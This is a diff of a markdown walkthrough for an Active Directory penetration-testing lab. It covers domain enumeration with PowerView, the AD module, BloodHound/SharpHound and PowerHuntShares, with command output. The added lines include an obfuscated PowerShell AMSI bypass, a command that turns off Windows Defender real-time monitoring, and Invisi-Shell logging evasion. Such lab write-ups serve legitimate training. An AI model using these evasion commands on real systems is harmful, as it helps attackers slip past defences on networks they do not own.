@@ -26,6 +26,8 @@ We can use PowerView for enumerating the domain. Please note that all the enumer
 
 Start a PowerShell session using Invisi-Shell to avoid enhanced logging. Run the below command from a command prompt on the student VM.
 
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
 `cd \AD\Tools`
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
@@ -333,6 +335,7 @@ MemberDistinguishedName : CN=Administrator,CN=Users,DC=moneycorp,DC=local
 MemberObjectClass       : user
 MemberSID               : S-1-5-21-335606122-960912869-3279953914-500📌
 ```
+🚩
 
 **Using Active Directory module (ADModule)**
 
@@ -340,10 +343,7 @@ Let's import the ADModule.
 
 **Note:** Remember to use it **from a different PowerShell session** started by using Invisi-Shell. If you load PowerView and the ADModule in same PowerShell session, some functions may not work.
 
-`exit`:
-```
-[SNIP]
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd \AD\Tools`
 
@@ -505,6 +505,7 @@ objectGUID        : bff03156-2c42-4e55-a21c-07eb868cd5f8
 SamAccountName    : Administrator👑
 SID               : S-1-5-21-335606122-960912869-3279953914-500
 ```
+🚩
 
 2. **Use BloodHound to identify the shortest path to Domain Admins in the `dollarcorp` domain**
 
@@ -517,6 +518,8 @@ BloodHound uses neo4j graph database, so that needs to be set up first.
 **Note:** Exit BloodHound once you have stopped using it as it uses good amount of RAM. You may also like to stop the neo4j service if you are not using BloodHound.
 
 We need to install the neo4j service. Unzip the archive `C:\AD\Tools\neo4j-community-4.1.1-windows.zip`.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin`
 
@@ -558,6 +561,8 @@ Now, open BloodHound Legacy with `C:\AD\Tools\BloodHound-win32-x64\BloodHound-wi
 ![BloodHound Legacy - Login](./assets/screenshots/learning_objective_01_bloodhound_legacy_login.png)
 
 Run a BloodHound ingestor to gather data and information about the current domain. Run the following commands to run SharpHound collector.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd \AD\Tools`
 
@@ -625,11 +630,16 @@ BloodHound legacy does not show Local Admin edge in GUI. The last version where 
 
 Make sure to use the collector from `BloodHound-4.0.3_old` with UI in `BloodHound-4.0.3_old`. These are not compatible with BloodHound 4.2.0.
 
-Run the below command in a new PowerShell session after bypassing .NET AMSI.
+Run the below command **in a new PowerShell session after bypassing .NET AMSI**.
 
-`cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors`
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
-`dir`:
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`dir C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors`:
 ```
     Directory: C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
 
@@ -641,6 +651,71 @@ d-----          1/7/2025   2:43 AM                DebugBuilds
 -a----         5/22/2024   1:37 AM         833024 SharpHound.exe
 -a----         5/22/2024   1:37 AM         974235 SharpHound.ps1
 ```
+
+`cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors`
+
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+`Import-Module .\SharpHound.ps1`
+
+`Invoke-BloodHound -CollectionMethod All`:
+```
+Exception calling "Load" with "1" argument(s): "Could not load file or assembly '833024 bytes loaded from Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral,
+PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format."
+At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:549 char:2
++     $Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : BadImageFormatException
+
+You cannot call a method on a null-valued expression.
+At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:552 char:2
++     $Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("At ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+You cannot call a method on a null-valued expression.
+At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:553 char:2
++     $Assembly.GetType("SharpHound3.SharpHound").GetMethod("InvokeShar ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+```
+❌
+
+![Windows Defender real-time protection turn off](./assets/screenshots/learning_objectives_windows_defender_turnoff.png)
+
+<🔄 Alternative Step🔄>
+
+`Set-MpPreference -DisableRealtimeMonitoring $true`
+
+</🔄 Alternative Step🔄>
+
+`Invoke-BloodHound -CollectionMethod All`:
+```
+-----------------------------------------------
+Initializing SharpHound at 2:40 AM on 2/21/2025
+-----------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain DOLLARCORP.MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+[+] Cache File Found! Loaded 339 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 79 MB RAM
+Status: 178 objects finished (+178 19.77778)/s -- Using 106 MB RAM
+Enumeration finished in 00:00:09.4358018
+Compressing data to C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\20250221024052_BloodHound.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 2:41 AM on 2/21/2025! Happy Graphing!
+```
+
+<🔄 Alternative Step🔄>
 
 `.\SharpHound.exe --CollectionMethod All`:
 ```
@@ -668,6 +743,8 @@ You can upload this file directly to the UI
 SharpHound Enumeration Completed at 4:59 AM on 2/12/2025! Happy Graphing!
 ```
 
+</🔄 Alternative Step🔄>
+
 Open the UI of BloodHound 4.0.3 with `C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-win32-x64\BloodHound.exe`.
 
 The username and password remain the same as both versions are using the same neo4j service. Remember to click on `Clear Database` option in the BloodHound 4.0.3 and upload new data from its own collector.
@@ -677,12 +754,15 @@ Search for `student422` in the search bar and click on the identity.
 In `Node Info`, scroll down to `LOCAL ADMIN RIGHTS` and expand `Derivative Local Admin Rights` to find if `student422` has derivate local admin rights on any machine.
 
 ![BloodHound 4.0.3 - Local Admin Rights](./assets/screenshots/learning_objective_01_bloodhound_403_local_admin_rights.png)
+🚩
 
 3. **Find a file share where `student422` has write permissions**
 
 We will use PowerHuntShares to search for file shares where `student422` has write permissions.
 
 Run the following commands from a PowerShell session started using Invisi-Shell.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd \AD\Tools`
 
@@ -823,6 +903,7 @@ Go to `ShareGraph` -> `Search Nodes: dcorp-ci` -> right click on `dcorp-ci` node
 It turns out that `Everyone` has privileges on the `AI` folder.
 
 ![PowerHuntShares - ShareGraph](./assets/screenshots/learning_objective_01_powerhuntshares_report_sharegraph.png)
+🚩
 
 ---
 ---
